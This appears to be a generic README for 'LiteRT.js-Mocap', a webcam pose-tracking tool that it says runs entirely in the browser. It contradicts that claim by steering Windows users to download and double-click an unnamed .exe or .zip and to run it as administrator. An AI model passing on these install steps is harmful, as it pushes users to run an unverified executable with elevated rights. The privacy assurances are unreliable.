🏃 LiteRT.js-Mocap - Track Human Movement With Your Browser

Download Software for Windows

📋 Overview

LiteRT.js-Mocap identifies human body positions using your computer camera. The software processes images in your web browser. This setup ensures your data stays on your machine. You do not need to upload video footage to any remote server.

💻 System Requirements

To run this application, your computer needs a few basic items:

  • A Windows 10 or Windows 11 operating system.
  • A functional webcam connected to your computer.
  • A modern web browser such as Chrome, Edge, or Firefox.
  • At least 4GB of RAM for smooth performance.

🚀 Downloading and Installation

Follow these steps to set up the software on your computer:

  1. Visit the official release page to find the latest version.
  2. Look for the section labeled Assets. Click the file ending in .zip or .exe to save it to your computer.
  3. Wait for the download to finish.
  4. Navigate to your Downloads folder and locate the saved file.
  5. Double-click the file to begin the setup process. Follow the instructions on the screen.

⚙️ Using the Application

Once you install the software, you can start tracking movement immediately:

  • Open the LiteRT.js-Mocap shortcut linked on your desktop.
  • The browser window will ask for permission to use your camera. Click Allow.
  • Position yourself in view of the camera. The software will create a wireframe model over your image.
  • Use the settings panel on the side to adjust tracking sensitivity if the system struggles to detect your limbs.

💡 Frequently Asked Questions

Does this track my data? No. The software runs entirely on your local machine. It does not store or send your camera data to the internet.

My camera shows black. What do I do? Ensure no other programs are currently using your webcam. If the issue persists, refresh your browser page.

Can I use this for professional projects? Yes, the underlying technology works for many animation and measurement tasks. Ensure you have adequate lighting for the best results.

🛠️ Troubleshooting

If you experience lag, close other open tabs in your browser. This software relies on your computer's graphics processor. Keeping browser tabs closed helps free up resources. If the software fails to open, ensure you run it as an administrator by right-clicking the icon and choosing Run as Administrator.
